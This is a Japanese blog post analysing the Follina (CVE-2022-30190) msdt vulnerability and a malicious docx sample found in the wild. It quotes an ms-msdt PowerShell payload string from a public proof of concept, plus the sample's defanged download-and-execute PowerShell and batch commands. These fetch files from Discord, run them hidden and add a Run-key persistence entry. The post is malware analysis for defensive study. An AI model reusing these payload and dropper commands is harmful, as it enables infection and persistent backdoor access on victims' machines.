    # 今更だけどFollinaをみてみる

6月に公開されて大騒ぎになったFollinaを今更見てみたいと思います。  
いや、もうパッチも当たってるしいらないよ、て話もあるかもしれませんが、まぁ時間があればお付き合いください。  

話を始める前に、まずはFollinaについてかいつまんで説明します。  

### Follinaって？

`CVE-2022-30190`で管理されている脆弱性です。Windowsでは診断ツールとして`msdt`というものがありますが、これの脆弱性です。  

で、重要なことはこの診断ツールを呼び出す様な処理はオフィスからも可能、ということです。  
これが怖いのは、マクロと違い、保護ビューとかそんなのは関係なく動いてしまうことにあります。試してはいないのですが、RTF形式ではプレビューで見るだけで感染するようですね。まぁ診断ツールですからそれだけで動くのは想像できます。  

### どうやって悪用するの？

山ほどPOCコードがありますので、それを見るのが一番理解ができると思います。  
例えば、以下です。  
https://github.com/chvancooten/follina.py

該当の個所を見ると以下ですね。これはpowershellのbase64コマンドを埋め込むときのイメージです。  
Note: encoded_commandに悪性のbase64コマンドを埋め込みます。  

```python
payload = fr'''"ms[-]msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke[-]Expression($(Invoke[-]Expression('[System[.]Text[.]Encoding]'+[char]58+[char]58+'Unicode[.]GetString([System[.]Convert]'+[char]58+[char]58+'From[Base64]String('+[char]34+'{encoded_command}'+[char]34+'))'))))i[/../../../../../../../../../../../../../../]Windows/System32/mpsigstub[.]exe\""'''
```

こういったコマンドを、`word/_rels/document.xml.rels`などのファイルに埋め込みます。  
ちなみにmsdt.exeに直接渡してもできるかな、と思って試しましたが、Defenderでブロックされました。Defenderを止めても動作せず。まぁ修正されてることが確認できたと考えましょう。  

![失敗画像](https://raw.githubusercontent.com/proshiba/analysis/main/follina/images/msdt01.png)

### 本番。検体を見てみる。  

今回、検体を見てみるうえで以下をチェックしました。
`432bae48edf446539cae5e20623c39507ad65e21cb757fb514aba635d3ae67d6`  
https://www.virustotal.com/gui/file/432bae48edf446539cae5e20623c39507ad65e21cb757fb514aba635d3ae67d6/details

このファイルは、malwarebazaarに上がっていたので、検体をダウンロードして内容を見てみます。  
ちなみにこのファイルはdocxですが、オフィスファイルは実はzip圧縮ファイルなので、zipとして解凍ができます。  
ということで、ファイルをダウンロードして解凍してみました。  

```bash
$ ls -la
total 24
drwxr-xr-x 5 kali kali 4096 Jul 11 12:54  .
drwxr-xr-x 3 kali kali 4096 Jul 11 12:54  ..
-rw-r--r-- 1 kali kali 1458 Jan  1  1980 '[Content_Types].xml'
drwxr-xr-x 2 kali kali 4096 Jun 14 21:43  _rels
drwxr-xr-x 2 kali kali 4096 Jun 14 21:43  docProps
drwxr-xr-x 6 kali kali 4096 Jun 14 21:43  word
```

大体こんな感じのファイル形式をしています。さて、まずは文字列情報を全て取って１つのテキストに保存してみましょう。   

```bash
grep -E ".*" -r ./* >> allstrings.txt
```

grepですべての文字列にマッチさせ、recurseで全ファイル対象としてます。  
この中のファイルを追加で見てみると、以下がありました。このdiscordのURLが悪性でしょう。こんなのはいるはずないですからね。  

対象ファイル: ./word/_rels/document.xml.rels  
```
～省略～
<Relationship Id="rId5" Type="hxxp://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="hxxps://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm!" TargetMode="External"/>
～省略～</Relationships>
```

こうなったらこのdiscordにアクセスしたいのですが、非常に残念なことにすでに403でアクセス不可でした。そのため、今度はvirustotalの動的解析情報を見ます。(一応言っておきますが、本来はこっちを先に見ます。ここで有益な情報見れるのにわざわざ検体見る必要ないですからね)  

そうすると、とても興味深いプロセス起動情報がございました。  

![virustotal情報](https://raw.githubusercontent.com/proshiba/analysis/main/follina/images/virustotal01.png)

以下のようなpowershell起動がありますが、これはさすがにありえないですね。base64コマンドを実行してます。今度はこの中身を見てみましょう。  

```powershell
(Invoke-Expression($(Invoke-Expression('[System[.]Text[.]Encoding]'+[char]58+[char]58+'UTF8[.]GetString([System[.]Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdl～省略～GFza3NcV29yZC5leGUgOw=='+[char]34+'
```

この省略したbase64コマンドの中身を見てみると、今度は以下のコマンドになってます。またdiscordですね。。

```powershell
Invoke-WebRequest hxxps://cdn[.]discordapp[[.]]com/attachments/986484515985825795/986495733295374366/cd[.]bat -OutFile C:\Windows\Tasks\cd[.]bat ; Start-Process  -WindowStyle Hidden 'C:\Windows\Tasks\cd[.]bat' ; Invoke-WebRequest hxxps://cdn[.]discordapp[[.]]com/attachments/986484515985825795/986484659363930122/Word[.]exe -OutFile C:\Windows\Tasks\Word[.]exe; C:\Windows\Tasks\Word[.]exe ;
```

さて、次です。この`word.exe`と`cd.bat`をそれぞれダウンロード、と行きたいところですが残念ながらword.exeは403でアクセスできず。  

cd.batは以下となってました。  
```bat
@echo off
%WinDir%\syswow64\windowspowershell\v1[.]0\powershell[.]exe -WindowStyle Hidden -Command "Invoke-WebRequest hxxps://cdn[.]discordapp[.]com/attachments/986484515985825795/986489283969953802/1c9c88f811662007[.]docx -OutFile C:\\users\$env:USERNAME\Downloads\18562[.]docx ;taskkill /f /im msdt[.]exe ; taskkill /f /im WINWORD[.]EXE; Start-Process C:\\users\$env:USERNAME\Downloads\18562[.]docx ;reg add 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run' /V 'Word' /t REG_SZ /F /D 'C:\\Windows\\Tasks\\Word[.]exe'; rm C:\Windows\Tasks\cd[.]bat;"
```

面白いことに追加でまたdocxファイルをダウンロードしてます。これはダミーのファイルでしょうね。ダウンロード後にファイル開いてますし。ハッシュをとってみたところ、以下でした。検知は0。  

https://www.virustotal.com/gui/file/e3af143ba12209fafdc3089a740d23faf59f6f1508c00d8f56f8cc9d0c8ebf89

最後に以下のレジストリに追加することで永続性を付与してます。  
パス: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
キー: Word
値: C:\\Windows\\Tasks\\Word.exe

後は後始末として`msdt.exe`などのプロセス停止や`cd.bat`の削除などです。これでマルウェア感染の初期は終了となります。  

結局この`word.exe`がペイロード、ということですね。残念ながらこのファイルは既にダウンロードできないため、詳細不明。ここで解析は終了とさせていただきます。

### 関連情報

最後に、discordを使っているのが面白いと思いましたのでちょっと見てみたところ、既に情報が出てました。

https://thehackernews.com/2022/07/hackers-exploiting-follina-bug-to.html

どうやら、このword.exeは`Rozena Backdoor`だったようですね。
中々面白いものとなってました。こういう重大な脆弱性でも、パッチを適用しない（そもそもセキュリティアップデートやニュースをみない）人が多いのがこの世の中ですし、今後もちょくちょく使われるんだろうな、と思わされますね。  

今回は、これで終了となります。ありがとうございました。

